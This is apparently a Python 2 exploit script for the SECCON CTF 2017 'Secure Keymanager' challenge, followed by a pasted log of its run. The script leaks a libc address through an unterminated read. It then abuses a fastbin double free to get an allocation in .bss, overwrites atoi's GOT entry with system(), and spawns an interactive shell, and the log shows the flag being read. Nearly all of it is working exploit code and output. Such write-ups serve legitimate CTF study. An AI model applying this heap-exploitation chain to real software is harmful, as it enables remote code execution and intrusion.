#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# SECCON CTF 2017 - Secure Keymanager (pwn 400pt)
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string
import time

account = 'ispo'
master  = 'passwd'                                  # must be larger than account

# --------------------------------------------------------------------------------------------------
def recv_until(st):                                 # receive until you encounter a string
    ret = ""

    while st not in ret:
        ret += s.recv(8192)

    return ret


# --------------------------------------------------------------------------------------------------
def add(keylen, title, key=''):
    s.send('1' + '\n')

    recv_until("Input key length...")
    s.send(str(keylen) + '\n')

    recv_until("Input title...")
    s.send(title + '\n')

    if key:
        recv_until("Input key...")
        s.send(key + '\n')

    recv_until(">>")

# --------------------------------------------------------------------------------------------------
def edit(id, key):
    s.send('3' + '\n')

    recv_until(">>")
    s.send(account + '\n')

    recv_until(">>")
    s.send(master + '\n')

    recv_until("Input id to edit...")
    s.send(str(id) + '\n')

    recv_until("Input new key...")
    s.send(key + '\n'),

    recv_until(">>")

# --------------------------------------------------------------------------------------------------
def remove(id):
    s.send('4' + '\n')

    recv_until(">>")
    s.send(account + '\n')

    recv_until(">>")
    s.send(master + '\n')

    recv_until("Input id to remove...")
    s.send(str(id) + '\n')

    recv_until(">>")


# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('secure_keymanager.pwn.seccon.jp', 47225))
    #s = socket.create_connection(('localhost', 7777))

    recv_until(">>")                                # eat banner

    # -------------------------------------------------------------------------
    # upon remove(), pointers in key_list are not zeroed out, so it's possible
    # to double-free(). There's also no check in malloc'ed size, so we can
    # allocate a chuck of 0 (which results in a 0x18+8 allocation), but we can
    # write 0x1f bytes on it (title is 0x20 bytes). However, we won't use this
    # vuln.
    # -------------------------------------------------------------------------

    # 0x61 is a fake chunk's size above key_list buffer
    account = 'ispo\x0a\x00\x00\x00' + struct.pack("<Q", 0x61)
    s.send(account + master + '\n')

    time.sleep(1)                                   # add some delay to not screw reads()
    recv_until(">>")

    account = 'ispo'
    time.sleep(1)

    # -------------------------------------------------------------------------
    # Leak a libc address (check_account() uses read() instead of getnline() so
    # it's not NULL terminated. There's a stale libc address on the buffer, so
    # we can leak it)
    #
    # Local:
    #   puts: 0x6fd60
    #   system: 0x46590
    #   read: 0xef320
    #
    # Remote:
    #   puts: 0x45390
    #   system: 0x46590
    #   read: 0xf7220
    # -------------------------------------------------------------------------
    s.send('9' + '\n')
    recv_until(">>")

    s.send('A'*0x27 + '\n')
    resp = recv_until(">>")
    off  = resp.rfind("AAAA\n") + 5                 #
    leak = struct.unpack("<Q", resp[off:off+8])[0]  # unpack it
    leak &= 0x0000ffffffffffff                      # each address is 48-bits

    # libc_base = leak - 0x142 - 0x6fd60              # we leak puts+0x142
    # system    = libc_base + 0x46590
    # __read    = libc_base + 0xef320

    libc_base = leak - 0x142 - 0x28 - 0x6f690       # we leak puts+0x16a
    system    = libc_base + 0x45390
    __read    = libc_base + 0xf7220

    print '[+] Leaking a libc address (puts+142):', hex(leak)
    print '[+] Libc base:', hex(libc_base)
    print '[+] Address of system():', hex(system)
    print '[+] Address of read():', hex(__read)


    # -------------------------------------------------------------------------
    # Use double free to abuse fastbins and force malloc to return a pointer
    # into .bss. To do that we need a fake chunk size at .bss (that's why
    # we add the 0x61 in the account name)
    # -------------------------------------------------------------------------
    print '[+] Allocating fastbin chunks...'
    add(0x35, '0'*10, 'b'*3)
    add(0x35, 'a'*10, 'b'*3)
    add(0x35, 'b'*10, 'b'*3)
    add(0x35, 'c'*10, 'b'*3)

    print '[+] Removing a chunk twice (double free)...'
    remove(0)
    remove(1)
    remove(2)                                       # bypass fasttop security check
    remove(1)

    # at 0x6020c0+8 there's 0x61 (fake chunk size)
    print '[+] Allocating the fastbin chunks again...'
    add(0x35, struct.pack("<Q", 0x6020c0) + 'd'*10, 'b'*3)
    add(0x35, 'e'*10, 'b'*3)
    add(0x35, 'f'*10, 'b'*3)

    # -------------------------------------------------------------------------
    # Ok we have a malloc() at .bss now. We overwrite a pointer in key_list
    # with an address in .got.
    #
    # This is a little bit tricky b/c malloc_usable_size() is used. In order to
    # make malloc_usable_size() not to return a size of 0, we need to have a
    # valid chunk size in .got. But such a value does not exists, as .got
    # contains only addresses. However, we get a valid size is we "mis-align"
    # the table. For example:
    #   0000000000602020  60 2D 90 5B E9 7F 00 00  C6 06 40 00 00 00 00 00
    #   0000000000602030  00 51 90 5B E9 7F 00 00  60 A1 91 5B E9 7F 00 00
    #
    # Although there's no entry with a value that can be used as chunk's size,
    # there's actually a hidden on at 0x602029:
    #   0000000000602021  2D 90 5B E9 7F 00 00 C6  06 40 00 00 00 00 00 00
    #
    # (ASLR is not an issue here as the 12 LSBits are not randomized)
    # -------------------------------------------------------------------------
    print '[+] This malloc() should point to .got'
    print '[+] .got.atoi() -> .got.system()'
    add(0x35, 'z'*16 + struct.pack("<Q", 0x602051 - 0x20), 'b'*3)

    # Overwrite a .got.atoi() with &system() (We have partial RELRO)
    ovfl  = struct.pack("<Q", __read)[1:]           # fix corrupted entries
    ovfl += 'A'*8
    ovfl += 'B'*8
    ovfl += 'C'*8
    ovfl += struct.pack("<Q", system)
    edit(0, ovfl)

    time.sleep(1)
    s.send('/bin/sh\x00' + '\n')

    print '[+] Opening Shell...'
    time.sleep(1)
    t = telnetlib.Telnet()                          # try to open shell
    t.sock = s
    t.interact()

# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl:~/ctf/2017/seccon_ctf/keymanager$ ./keymanager_expl.py
[+] Leaking a libc address (puts+142): 0x7fcdfa30a7fa
[+] Libc base: 0x7fcdfa29b000
[+] Address of system(): 0x7fcdfa2e0390
[+] Address of read(): 0x7fcdfa392220
[+] Allocating fastbin chunks...
[+] Removing a chunk twice (double free)...
[+] Allocating the fastbin chunks again...
[+] This malloc should point to .got
[+] .got.atoi() -> .got.system()
[+] Opening Shell...
    id
        uid=10395 gid=10000(sec_km) groups=10000(sec_km)
    date
        Tue Dec 12 08:57:04 JST 2017
    ls -la
        total 44
        drwxr-x--- 2 root sec_km  4096 Dec 10 01:23 .
        drwxr-xr-x 6 root root    4096 Nov 28 18:36 ..
        -rw-r----- 1 root sec_km   220 Sep  1  2015 .bash_logout
        -rw-r----- 1 root sec_km  3771 Sep  1  2015 .bashrc
        -rw-r----- 1 root sec_km   139 Dec 10 01:23 .comment
        -rw-r----- 1 root sec_km   655 May 16  2017 .profile
        -rw-r----- 1 root sec_km    32 Nov 23 14:45 flag.txt
        -rwxr-x--- 1 root sec_km 13728 Nov 23 14:45 secure_keymanager
    cat flag.txt
        SECCON{C4n_y0u_b347_h34p_45lr?}
    cat .comment
        Inspired by "House of Rabbit"
        - http://shift-crops.hatenablog.com/entry/2017/09/17/213235
        - https://github.com/shift-crops/House_of_Rabbit
    exit

*** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
